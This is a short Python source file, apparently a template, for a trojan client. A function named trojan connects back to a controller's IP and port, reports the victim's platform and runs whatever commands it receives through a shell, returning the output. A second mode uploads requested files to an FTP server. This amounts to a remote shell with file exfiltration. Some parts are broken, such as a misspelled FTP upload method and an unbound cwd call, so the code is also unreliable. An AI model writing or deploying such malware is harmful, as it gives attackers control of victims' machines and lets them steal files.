

import ftplib
import os
import socket
import subprocess
import sys
import threading

def ftp_send(file) -> None:
    ftp = ftplib.FTP({str(ftp_credentials[0])})
    ftp.login({str(ftp_credentials[1])}, {str(ftp_credentials[2])})
    ftp.cwd("/pub/")
    ftp.storebinary("STOR " + os.path.basename(file), 
                    open(file, "rb"), 1024)
    ftp.quit()

def trojan() -> None:
    global client

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((IP, PORT))
    
    except:
        pass
  
    else:
        terminal_mode = True
        client.send(sys.platform.encode())
        while True:
            try:
                server_command = client.recv(8192).decode()

                if server_command == "cmdon":
                    terminal_mode = True
                    client.send(b"Terminal mode activeted")
                    continue
                
                elif server_command == "cmdoff":
                    terminal_mode = False
                    client.send(b"Terminal mode disactiveted")
                    continue
            
                if terminal_mode:
                    output = subprocess.check_output(server_command, shell=True)
                    client.send(output if output != b'' else b"Done")

                else:
                    server_command = server_command.split()

                    if server_command[0] == "ftp::recv":
                        ftp_send(server_command[1])   

                    elif server_command[0] == "ftp::cd":
                        ftplib.FTP.cwd(server_command[1])

                    else:
                        client.send(b"Command not found...")
            
            except Exception as e:
                try:
                    client.send(str(e).encode())
                except:
                    pass

if __name__ == "__main__":
    pass